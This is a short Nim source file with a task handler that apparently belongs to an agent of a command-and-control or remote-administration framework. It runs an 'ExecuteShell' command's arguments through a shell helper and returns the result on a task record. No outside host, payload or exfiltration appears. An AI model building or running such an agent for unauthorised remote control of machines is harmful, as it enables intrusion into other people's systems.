import ./types 
import ./commands/commands

proc handleTask*(task: Task): Task = 
    
    # Handle task command
    case task.command: 
    of ExecuteShell: 
        
        let cmdResult = taskShell(task.args)
        echo cmdResult

        return Task(
            id: task.id, 
            agent: task.agent,
            command: task.command,
            args: task.args,
            result: cmdResult,
            status: Completed
        )

    else: 
        echo "Not implemented"
        return nil 

    return task